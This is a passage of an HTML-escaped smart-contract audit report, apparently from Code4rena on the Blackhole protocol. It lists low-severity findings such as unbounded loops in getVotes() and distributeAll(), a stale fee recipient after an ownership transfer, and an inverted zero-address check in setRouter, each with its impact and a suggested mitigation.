lock may receive no bonus at all.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eEnforce a minimum bonus floor.\u003c/p\u003e\n\u003ch2 id=\"06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks\" style=\"position:relative;\"\u003e\u003ca href=\"#06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks\" aria-label=\"06 getvotes wiew function becomes unusable when a user owns too many locks permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[06] \u003ccode\u003egetVotes()\u003c/code\u003e wiew function becomes unusable when a user owns too many locks\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1231\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1231\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-17\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-17\" aria-label=\"finding description 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003egetVotes()\u003c/code\u003e function in the VotingEscrow contract is responsible for computing a user’s voting power by summing the voting weights of all lock NFTs (token IDs) they held at the latest checkpoint:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecpData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echeckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingBalanceLogic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOfNFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingBalanceLogicData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis implementation assumes the number of token IDs per user remains reasonably small. However, in practice, a user can accumulate a large number of locks through creation of locks, splits, or transfers — potentially owning hundreds of NFT’s.\u003c/p\u003e\n\u003cp\u003eBecause \u003ccode\u003egetVotes()\u003c/code\u003e is a view function that loops over all token IDs and performs expensive computations for each, this view function can lead to gas exhaustion and revert.\u003c/p\u003e\n\u003ch3 id=\"impact-17\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-17\" aria-label=\"impact 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUnusable view function, due to gas exhaustion.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe protocol should only allow users to own a specific amount of locks.\u003c/p\u003e\n\u003ch2 id=\"07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges\" style=\"position:relative;\"\u003e\u003ca href=\"#07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges\" aria-label=\"07 distributeall function at risk of repeated failure due to unbounded loop over gauges permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[07] \u003ccode\u003edistributeAll()\u003c/code\u003e function at risk of repeated failure due to unbounded loop over gauges\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeManager.sol#L341\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeManager.sol#L341\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-18\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-18\" aria-label=\"finding description 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003edistributeAll()\u003c/code\u003e function aims to distribute emissions to all gauges by iterating over the entire list of pools and calling an internal \u003ccode\u003e_distribute\u003c/code\u003e function on each corresponding gauge. While this approach appears straightforward, it employs an unbounded for loop based on the dynamic length of the pools array. As the number of pools grows, the gas cost of executing this function increases proportionally, potentially leading to out-of-gas errors and causing the function to fail.\u003c/p\u003e\n\u003cp\u003eIn large-scale deployments, it’s common for protocols to have hundreds of gauges, each associated with multiple pools. For example, with just 500 gauges each having 5 pools, the loop would have to iterate over 2,500 pools. This poses a serious risk as the gas cost per iteration adds up quickly.\u003c/p\u003e\n\u003ch3 id=\"impact-18\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-18\" aria-label=\"impact 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eDenial of Service (DoS): As the number of pools increases, the \u003ccode\u003edistributeAll()\u003c/code\u003e function is likely to exceed the block gas limit, causing it to revert. This prevents emissions from being distributed entirely.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement a \u003ccode\u003ecanDistributeAll()\u003c/code\u003e view function that simulates the loop’s expected gas cost and compares it against a conservative gas limit threshold. This allows off-chain tools and frontend interfaces to pre-check if calling \u003ccode\u003edistributeAll()\u003c/code\u003e would likely succeed without incurring gas costs.\u003c/p\u003e\n\u003ch2 id=\"08-fee-recipient-may-remain-set-to-previous-owner\" style=\"position:relative;\"\u003e\u003ca href=\"#08-fee-recipient-may-remain-set-to-previous-owner\" aria-label=\"08 fee recipient may remain set to previous owner permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[08] Fee recipient may remain set to previous owner\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/CustomPoolDeployer.sol#L179\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/CustomPoolDeployer.sol#L179\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-19\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-19\" aria-label=\"finding description 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esetAlgebraFeeRecipient()\u003c/code\u003e function allows the current owner to set a address to receive protocol fees. However, there is no automatic reset or update of the \u003ccode\u003ealgebraFeeRecipient\u003c/code\u003e when ownership is transferred. This creates a risk where the previous owner continues to receive protocol fees even after relinquishing ownership unintentionally.\u003c/p\u003e\n\u003ch3 id=\"impact-19\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-19\" aria-label=\"impact 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eRevenue leakage: Fees meant for the protocol or new owner could be misdirected to the previous owner unintentionally.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd a \u003ccode\u003etransferOwnership()\u003c/code\u003e hook that also resets or revalidates sensitive roles (like fee recipient).\u003c/p\u003e\n\u003ch2 id=\"09-incorrect-setrouter-function-only-allows-zero-address-to-pass\" style=\"position:relative;\"\u003e\u003ca href=\"#09-incorrect-setrouter-function-only-allows-zero-address-to-pass\" aria-label=\"09 incorrect setrouter function only allows zero address to pass permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[09] Incorrect \u003ccode\u003esetRouter\u003c/code\u003e function only allows zero address to pass\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L313\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L313\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-20\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-20\" aria-label=\"finding description 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eIn the GenesisPoolManager.sol contract, the \u003ccode\u003esetRouter\u003c/code\u003e function has a logic flaw. \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis means the function only allows setting the router address to zero, which is usually the opposite of the intended behavior.\u003c/p\u003e\n\u003ch3 id=\"impact-20\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-20\" aria-label=\"impact 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe owner may never be able to set a valid router.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 